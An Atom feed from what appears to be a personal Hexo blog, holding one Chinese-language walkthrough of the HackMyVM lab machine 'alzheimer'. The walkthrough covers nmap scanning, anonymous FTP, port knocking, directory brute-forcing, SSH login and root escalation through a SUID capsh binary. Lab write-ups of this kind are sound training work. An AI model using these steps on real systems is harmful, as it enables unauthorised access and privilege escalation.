<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>LonTan0&#39;s Blog</title>
  
  
  <link href="https://lontan0.github.io/atom.xml" rel="self"/>
  
  <link href="https://lontan0.github.io/"/>
  <updated>2025-07-01T09:57:54.586Z</updated>
  <id>https://lontan0.github.io/</id>
  
  <author>
    <name>LonTan0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>alzheimer</title>
    <link href="https://lontan0.github.io/2025/07/01/alzheimer/"/>
    <id>https://lontan0.github.io/2025/07/01/alzheimer/</id>
    <published>2025-07-01T06:00:00.000Z</published>
    <updated>2025-07-01T09:57:54.586Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、信息收集阶段"><a href="#一、信息收集阶段" class="headerlink" title="一、信息收集阶段"></a>一、信息收集阶段</h2><p>使用 <code>nmap</code> 进行基础服务扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.101</span><br><span class="line">21/tcp open     ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp filtered http</span><br></pre></td></tr></table></figure><p>仅 21 端口开放，22 与 80 被防火墙过滤。</p><h2 id="二、FTP-匿名访问"><a href="#二、FTP-匿名访问" class="headerlink" title="二、FTP 匿名访问"></a>二、FTP 匿名访问</h2><p>尝试匿名登录 FTP：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101</span><br></pre></td></tr></table></figure><p>使用 <code>anonymous</code> 用户成功登录，列出文件后发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.secretnote.txt</span><br></pre></td></tr></table></figure><p>读取该文件内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .secretnote.txt</span><br></pre></td></tr></table></figure><p>输出内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I need to knock this ports and </span><br><span class="line">one door will be open!</span><br><span class="line">1000</span><br><span class="line">2000</span><br><span class="line">3000</span><br></pre></td></tr></table></figure><blockquote><p>💡 判断为端口敲门（Port Knocking）机制 —— 按顺序访问指定端口后会触发服务开放。</p></blockquote><hr><h2 id="三、触发端口敲门"><a href="#三、触发端口敲门" class="headerlink" title="三、触发端口敲门"></a>三、触发端口敲门</h2><p>使用 <code>nmap</code> 模拟访问指定端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --host-timeout 201 --max-retries 0 -p 1000,2000,3000 192.168.56.101</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="comment">#knock 192.168.56.101 1000 2000 3000</span></span><br></pre></td></tr></table></figure><p>再次扫描开放端口，发现 SSH 与 HTTP 已开放：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.101</span><br></pre></td></tr></table></figure><p>扫描结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br></pre></td></tr></table></figure><hr><h2 id="四、Web-信息搜集"><a href="#四、Web-信息搜集" class="headerlink" title="四、Web 信息搜集"></a>四、Web 信息搜集</h2><p>访问首页：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.101</span><br></pre></td></tr></table></figure><p>返回内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I dont remember where I stored my password :(</span><br><span class="line">I only remember that was into a .txt file...</span><br><span class="line">-medusa</span><br><span class="line"></span><br><span class="line">&lt;!---. --- - .... .. -. --. --&gt;</span><br></pre></td></tr></table></figure><ul><li>可疑用户名：<code>medusa</code></li><li>页面隐藏摩斯密码：<code>--- --- - .... .. -. --.</code> 解码为 “nothing”</li></ul><hr><h2 id="五、目录扫描"><a href="#五、目录扫描" class="headerlink" title="五、目录扫描"></a>五、目录扫描</h2><p>对 Web 服务进行目录爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40</span><br></pre></td></tr></table></figure><p>发现路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin</span><br><span class="line">/home</span><br><span class="line">/secret</span><br></pre></td></tr></table></figure><p>但这些目录中的内容多为迷惑信息，无显著突破。</p><hr><h2 id="六、回到-FTP，文件发生变化"><a href="#六、回到-FTP，文件发生变化" class="headerlink" title="六、回到 FTP，文件发生变化"></a>六、回到 FTP，文件发生变化</h2><p>重新连接 FTP，发现 <code>.secretnote.txt</code> 内容发生了变化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">I need to knock this ports and </span><br><span class="line">one door will be open!</span><br><span class="line">1000</span><br><span class="line">2000</span><br><span class="line">3000</span><br><span class="line">Ihavebeenalwayshere!!!</span><br></pre></td></tr></table></figure><p>推测为提示我们已完成敲门，服务全部开放，下一步可登录 SSH。</p><hr><h2 id="七、SSH-登录与提权"><a href="#七、SSH-登录与提权" class="headerlink" title="七、SSH 登录与提权"></a>七、SSH 登录与提权</h2><p>使用用户名 <code>medusa</code> 和密码登录 SSH（密码推测来源于 FTP 或站点信息）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh medusa@192.168.56.101</span><br></pre></td></tr></table></figure><h3 id="7-1-sudo-权限枚举"><a href="#7-1-sudo-权限枚举" class="headerlink" title="7.1 sudo 权限枚举"></a>7.1 sudo 权限枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure><p>发现可执行 <code>/bin/id</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL) NOPASSWD: /bin/id</span><br></pre></td></tr></table></figure><p>无明显提权突破，继续寻找 SUID 程序。</p><h3 id="7-2-查找-SUID-程序"><a href="#7-2-查找-SUID-程序" class="headerlink" title="7.2 查找 SUID 程序"></a>7.2 查找 SUID 程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>发现关键提权点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/capsh</span><br></pre></td></tr></table></figure><p>该程序支持通过 <code>--uid=0 --gid=0</code> 提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/capsh --gid=0 --uid=0 --</span><br></pre></td></tr></table></figure><p>获取 <code>root</code> shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>成功提权。</p><hr><h2 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h2><ul><li>利用了 FTP 匿名访问发现敲门信息</li><li>模拟敲门成功开放被过滤端口</li><li>利用存在的 SUID 程序 capsh 成功提权为 root</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、信息收集阶段&quot;&gt;&lt;a href=&quot;#一、信息收集阶段&quot; class=&quot;headerlink&quot; title=&quot;一、信息收集阶段&quot;&gt;&lt;/a&gt;一、信息收集阶段&lt;/h2&gt;&lt;p&gt;使用 &lt;code&gt;nmap&lt;/code&gt; 进行基础服务扫描：&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    <category term="靶机" scheme="https://lontan0.github.io/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
    <category term="靶机" scheme="https://lontan0.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
    <category term="hackmyvm" scheme="https://lontan0.github.io/tags/hackmyvm/"/>
    
  </entry>
  
</feed>
